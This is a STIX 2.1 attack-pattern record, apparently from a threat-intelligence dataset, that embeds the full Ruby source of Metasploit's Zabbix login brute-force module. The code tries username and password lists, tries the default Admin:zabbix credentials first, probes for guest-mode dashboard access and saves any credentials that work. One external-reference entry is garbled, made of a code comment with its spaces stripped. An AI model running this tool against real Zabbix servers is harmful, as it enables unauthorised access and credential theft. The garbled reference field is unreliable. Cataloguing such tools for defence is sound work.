{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7d60c4d0-9a6d-45bb-b00a-5354cf85668d",
    "created": "2024-08-14T16:30:27.626449Z",
    "modified": "2024-08-14T16:30:27.626453Z",
    "name": "Zabbix Server Brute Force Utility",
    "description": " This module attempts to login to Zabbix server instance using username and password combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options. It will also test for the Zabbix default login (Admin:zabbix) and guest access. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/zabbix_login.rb",
            "external_id": "zabbix_login.rb"
        },
        {
            "source_name": "else#OtherwisetargetismostlikelyanewerversionofZabbix",
            "external_id": "soletstrytheupdatedURL."
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/login_scanner/zabbix'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Zabbix Server Brute Force Utility',\n      'Description'    => %q{\n        This module attempts to login to Zabbix server instance using username and password\n        combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options. It\n        will also test for the Zabbix default login (Admin:zabbix) and guest access.\n      },\n      'Author'         =>\n        [\n          'hdm'\n        ],\n      'License'        => MSF_LICENSE\n    )\n\n    deregister_options('PASSWORD_SPRAY')\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [ true,  'The path to the Zabbix server application', '/zabbix/']),\n      ])\n  end\n\n  #\n  # main\n  #\n  def run_host(ip)\n    init_loginscanner(ip)\n    msg = @scanner.check_setup\n    if msg\n      print_brute :level => :error, :ip => rhost, :msg => msg\n      return\n    end\n\n    print_brute :level=>:status, :ip=>rhost, :msg=>(\"Found Zabbix version #{@scanner.version}\")\n\n    if is_guest_mode_enabled?\n      print_brute :level => :good, :ip => ip, :msg => \"Note: This Zabbix instance has Guest mode enabled\"\n    else\n      print_brute :level=>:status, :ip=>rhost, :msg=>(\"This Zabbix instance has disabled Guest mode\")\n    end\n\n    bruteforce(ip)\n  end\n\n  def bruteforce(ip)\n    @scanner.scan! do |result|\n      case result.status\n        when Metasploit::Model::Login::Status::SUCCESSFUL\n          print_brute :level => :good, :ip => ip, :msg => \"Success: '#{result.credential}'\"\n          do_report(ip, rport, result)\n          :next_user\n        when Metasploit::Model::Login::Status::DENIED_ACCESS\n          print_brute :level => :status, :ip => ip, :msg => \"Correct credentials, but unable to login: '#{result.credential}'\"\n          do_report(ip, rport, result)\n          :next_user\n        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n          if datastore['VERBOSE']\n            print_brute :level => :verror, :ip => ip, :msg => \"Could not connect\"\n          end\n          invalidate_login(\n            address: ip,\n            port: rport,\n            protocol: 'tcp',\n            public: result.credential.public,\n            private: result.credential.private,\n            realm_key: result.credential.realm_key,\n            realm_value: result.credential.realm,\n            status: result.status\n          )\n          :abort\n        when Metasploit::Model::Login::Status::INCORRECT\n          if datastore['VERBOSE']\n            print_brute :level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}'\"\n          end\n          invalidate_login(\n            address: ip,\n            port: rport,\n            protocol: 'tcp',\n            public: result.credential.public,\n            private: result.credential.private,\n            realm_key: result.credential.realm_key,\n            realm_value: result.credential.realm,\n            status: result.status\n          )\n      end\n    end\n  end\n\n  def do_report(ip, port, result)\n    service_data = {\n      address: ip,\n      port: port,\n      service_name: 'http',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: self.fullname,\n      origin_type: :service,\n      private_data: result.credential.private,\n      private_type: :password,\n      username: result.credential.public,\n    }.merge(service_data)\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      last_attempted_at: DateTime.now,\n      status: result.status\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def init_loginscanner(ip)\n    @cred_collection = build_credential_collection(\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n\n    # Always try the default first\n    @cred_collection.prepend_cred(\n      Metasploit::Framework::Credential.new(public: 'Admin', private: 'zabbix')\n    )\n\n    @scanner = Metasploit::Framework::LoginScanner::Zabbix.new(\n      configure_http_login_scanner(\n        uri:                datastore['TARGETURI'],\n        cred_details:       @cred_collection,\n        stop_on_success:    datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 5,\n        http_username:      datastore['HttpUsername'],\n        http_password:      datastore['HttpPassword']\n      )\n    )\n  end\n\n  #\n  # From the documentation:\n  #\n  # \"In case of five consecutive failed login attempts, Zabbix interface will pause for 30\n  # seconds in order to prevent brute force and dictionary attacks.\"\n  #\n\n  # Zabbix enables a Guest mode by default that allows access to the dashboard without auth\n  def is_guest_mode_enabled?\n    dashboard_uri = normalize_uri(datastore['TARGETURI'] + '/' + 'dashboard.php')\n    res = send_request_cgi({'uri'=>dashboard_uri})\n    if (res && res.code == 200 && res.body.to_s =~ /<title>.*: Dashboard<\\/title>/)\n      return true\n    else # Otherwise target is most likely a newer version of Zabbix, so lets try the updated URL.\n      dashboard_uri = normalize_uri(datastore['TARGETURI'] + '/' + 'zabbix.php')\n      res = send_request_cgi({\n        'uri' => dashboard_uri,\n        'vars_get' => { 'action' => 'dashboard.view' }\n      })\n      if (res && res.code == 200 && res.body.to_s =~ /<title>.*: Dashboard<\\/title>/)\n        return true\n      else\n        return false\n      end\n    end\n  end\nend\n"
}